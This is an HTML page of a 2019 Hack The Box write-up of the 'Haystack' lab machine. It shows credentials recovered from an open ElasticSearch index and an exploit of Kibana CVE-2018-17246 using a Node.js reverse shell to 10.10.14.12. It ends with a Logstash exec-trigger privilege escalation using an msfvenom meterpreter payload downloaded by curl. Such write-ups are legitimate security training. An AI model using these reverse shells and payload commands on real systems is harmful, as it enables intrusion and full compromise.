@@ -1,0 +1,708 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Haystack - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SSH shell. After exploiting CVE-2018-17246 in Kibana, I get another shell with user kibana who has read access on the configuration for logstash which is running as root. The logstash configuration will run as root any command placed in a specific logstash directory/file so once I figured that out it was easy to get a root shell.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Haystack - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-haystack/">
+
+
+  <meta property="og:description" content="Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SSH shell. After exploiting CVE-2018-17246 in Kibana, I get another shell with user kibana who has read access on the configuration for logstash which is running as root. The logstash configuration will run as root any command placed in a specific logstash directory/file so once I figured that out it was easy to get a root shell.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-haystack/haystack_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-11-02T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-haystack/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Haystack - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Haystack - Hack The Box">
+    <meta itemprop="description" content="Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SSH shell. After exploiting CVE-2018-17246 in Kibana, I get another shell with user kibana who has read access on the configuration for logstash which is running as root. The logstash configuration will run as root any command placed in a specific logstash directory/file so once I figured that out it was easy to get a root shell.">
+    <meta itemprop="datePublished" content="November 02, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Haystack - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-11-02T00:00:00+01:00">November 02, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-haystack/haystack_logo.png" alt="" /></p>
+
+<p>Haystack is an easy ctf-like box where the initial credentials can be found hidden in an ElasticSearch database. Knowing some ES API syntax it’s very easy to retrieve the credentials then get an SSH shell. After exploiting CVE-2018-17246 in Kibana, I get another shell with user kibana who has read access on the configuration for logstash which is running as root. The logstash configuration will run as root any command placed in a specific logstash directory/file so once I figured that out it was easy to get a root shell.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>The SSH password for user security can be found in the ElasticSearch database which is publicly accessible</li>
+  <li>A vulnerability exists in Kibana (CVE-2018-17246) which let us get RCE and land a shell as user kibana</li>
+  <li>Logstash is configured to root as root and will run commands we specify in a specific log file</li>
+</ul>
+
+<h3 id="portscan">Portscan</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.115
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 13:28 EDT
+Nmap scan report for haystack.htb (10.10.10.115)
+Host is up (0.018s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+| http-methods: 
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 311.13 seconds
+</code></pre></div></div>
+
+<h3 id="webpage">Webpage</h3>
+
+<p>The webpage just has an image of a needle in a haystack.</p>
+
+<p><img src="/assets/images/htb-writeup-haystack/needle.png" alt="" /></p>
+
+<p>I ran gobuster but didn’t find anything else on the site.</p>
+
+<p>The image doesn have something hidden in it. I ran strings and found some base64 at the end.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># strings needle.jpg | tail -n 1
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># strings needle.jpg | tail -n 1 | base64 -d
+la aguja en el pajar es "clave"
+</code></pre></div></div>
+
+<p>I don’t know spanish so I translated it with Google Translate: <code class="language-plaintext highlighter-rouge">the needle in the haystack is "key"</code></p>
+
+<h3 id="elasticsearch">ElasticSearch</h3>
+
+<p>Port 9200 is a well-known port for the ElasticSearch database. When I do a GET on / I see that it’s running verison 6.4.2:</p>
+
+<p><img src="/assets/images/htb-writeup-haystack/es1.png" alt="" /></p>
+
+<p>I can retrieve the list of indices with the <code class="language-plaintext highlighter-rouge">_cat/indices</code> API call:</p>
+
+<p><img src="/assets/images/htb-writeup-haystack/es2.png" alt="" /></p>
+
+<p>There are two user created indices: <code class="language-plaintext highlighter-rouge">quotes</code> and <code class="language-plaintext highlighter-rouge">bank</code></p>
+
+<p>To retrieve the content of the index, I use the <code class="language-plaintext highlighter-rouge">/bank/_search</code> API call:</p>
+
+<p><img src="/assets/images/htb-writeup-haystack/es3.png" alt="" /></p>
+
+<p>By default, it only returns 10 records. To get the full list we can increase the size with <code class="language-plaintext highlighter-rouge">/bank/_search?size=1000</code>.</p>
+
+<p>I didn’t find anything interesting in the <code class="language-plaintext highlighter-rouge">bank</code> index. It just has bank records but no useful information.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">quotes</code> index contains a bunch of quotes in spanish but a few records have base64 encoded data in them:</p>
+
+<p><code class="language-plaintext highlighter-rouge">"quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="</code>
+<code class="language-plaintext highlighter-rouge">"quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg"</code></p>
+
+<p>The base64 above is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user: security 
+pass: spanish.is.key
+</code></pre></div></div>
+
+<p>I can SSH in with the credentials above and get the user flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[security@haystack ~]$ id
+uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[security@haystack ~]$ ls
+user.txt
+[security@haystack ~]$ cat user.txt
+04d18b...
+</code></pre></div></div>
+
+<h3 id="getting-access-to-user-kibana">Getting access to user kibana</h3>
+
+<p>The box has the full ELK stack installed (ElasticSearch, Logstash and Kibana):</p>
+
+<ul>
+  <li>Port 9200 is ES</li>
+  <li>Port 9600 is logstash</li>
+  <li>Port 5601 is Kibana</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[security@haystack ~]$ ss -ln
+[...]
+tcp   LISTEN   0   128                  *:80
+tcp   LISTEN   0   128                  *:9200
+tcp   LISTEN   0   128                  *:22
+tcp   LISTEN   0   128          127.0.0.1:5601
+tcp   LISTEN   0   128   ::ffff:127.0.0.1:9000
+tcp   LISTEN   0   128                 :::80
+tcp   LISTEN   0   128   ::ffff:127.0.0.1:9300
+tcp   LISTEN   0   128                 :::22
+tcp   LISTEN   0   50    ::ffff:127.0.0.1:9600
+</code></pre></div></div>
+
+<p>I can see that Kibana is running as user <code class="language-plaintext highlighter-rouge">kibana</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kibana     6370  1.9  5.3 1345840 206188 ?      Ssl  09:24   0:22 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
+</code></pre></div></div>
+
+<p>Logstash is running as <code class="language-plaintext highlighter-rouge">root</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root       6371 11.6 12.4 2733400 480372 ?      SNsl 09:24   2:15 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
+</code></pre></div></div>
+
+<p>ElasticSearch is running as <code class="language-plaintext highlighter-rouge">elasticsearch</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elastic+   6960  7.1 34.4 3319312 1330936 ?     Ssl  09:24   1:21 /bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djna.nosys=true -XX:-OmitStackTraceInFastThrow -Dio.netty.noUnsafe=true -Dio.netty.noKeySetOptimization=true -Dio.netty.recycler.maxCapacityPerThread=0 -Dlog4j.shutdownHookEnabled=false -Dlog4j2.disable.jmx=true -Djava.io.tmpdir=/tmp/elasticsearch.nDIY3AAQ -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/var/lib/elasticsearch -XX:ErrorFile=/var/log/elasticsearch/hs_err_pid%p.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -XX:+PrintGCApplicationStoppedTime -Xloggc:/var/log/elasticsearch/gc.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=32 -XX:GCLogFileSize=64m -Des.path.home=/usr/share/elasticsearch -Des.path.conf=/etc/elasticsearch -Des.distribution.flavor=default -Des.distribution.type=rpm -cp /usr/share/elasticsearch/lib/* org.elasticsearch.bootstrap.Elasticsearch -p /var/run/elasticsearch/elasticsearch.pid --quiet
+</code></pre></div></div>
+
+<p>Logstash and Kibaba are only listening on localhost. To access the ports from my box I set up SSH local port forwarding: <code class="language-plaintext highlighter-rouge"># ssh -L 5601:127.0.0.1:5601 -L 9600:127.0.0.1:9600 security@10.10.10.115</code></p>
+
+<p>Kibana is running version <code class="language-plaintext highlighter-rouge">Version: 6.4.2</code>:</p>
+
+<p><img src="/assets/images/htb-writeup-haystack/es4.png" alt="" /></p>
+
+<p>There’s an LFI CVE in Kibana for that version which let us execute Javascript code.</p>
+
+<p><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></p>
+
+<p>I created <code class="language-plaintext highlighter-rouge">/tmp/shell.js</code> with a standard reverse shell:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
+        <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
+        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">/bin/sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
+    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span>
+    <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="mi">4444</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10.10.14.12</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application form crashing</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+
+<p>I then triggered my payload with <code class="language-plaintext highlighter-rouge">curl "http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/shell.js"</code></p>
+
+<p>A got a callback soon after:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.115.
+Ncat: Connection from 10.10.10.115:47552.
+id
+uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.2$ 
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>I saw earlier that logstash is running as root and with user <code class="language-plaintext highlighter-rouge">kibana</code> I have access to the configuration files in <code class="language-plaintext highlighter-rouge">/etc/logstash/conf.d</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ ls -l
+total 12
+-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+bash-4.2$ cat *
+filter {
+	if [type] == "execute" {
+		grok {
+			match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+		}
+	}
+}
+input {
+	file {
+		path =&gt; "/opt/kibana/logstash_*"
+		start_position =&gt; "beginning"
+		sincedb_path =&gt; "/dev/null"
+		stat_interval =&gt; "10 second"
+		type =&gt; "execute"
+		mode =&gt; "read"
+	}
+}
+output {
+	if [type] == "execute" {
+		stdout { codec =&gt; json }
+		exec {
+			command =&gt; "%{comando} &amp;"
+		}
+	}
+}
+</code></pre></div></div>
+
+<p>Logstash has filters configured to execute commands put in <code class="language-plaintext highlighter-rouge">/opt/kibana/logstash_*</code> where the message contains <code class="language-plaintext highlighter-rouge">Ejecutar comando : </code> followed by a command.</p>
+
+<p>I created a meterpreter binary payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ragingunicorn:~/htb/haystack# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.12 LPORT=5555
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 129 bytes
+Final size of elf file: 249 bytes
+Saved as: met
+root@ragingunicorn:~/htb/haystack# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+</code></pre></div></div>
+
+<p>Then transfered it to the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ curl -o /tmp/met http://10.10.14.12/met &amp;&amp; chmod 777 /tmp/met
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   249  100   249    0     0   6119      0 --:--:-- --:--:-- --:--:--  6225
+</code></pre></div></div>
+
+<p>Then I created the trigger file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ echo "/tmp/met" &gt; /opt/kibana/logstash_1 
+</code></pre></div></div>
+
+<p>I waited a few minutes then got a callback as root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell
+Process 12972 created.
+Channel 1 created.
+cat /root/root.txt
+3f5f72...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ctf-like" class="page__taxonomy-item" rel="tag">ctf-like</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cve-2018-17246" class="page__taxonomy-item" rel="tag">CVE-2018-17246</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#easy" class="page__taxonomy-item" rel="tag">easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#elasticsearch" class="page__taxonomy-item" rel="tag">elasticsearch</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kibana" class="page__taxonomy-item" rel="tag">kibana</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#logstash" class="page__taxonomy-item" rel="tag">logstash</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-11-02T00:00:00+01:00">November 02, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-safe/" class="pagination--pager" title="Safe - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-jarvis/" class="pagination--pager" title="Jarvis - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
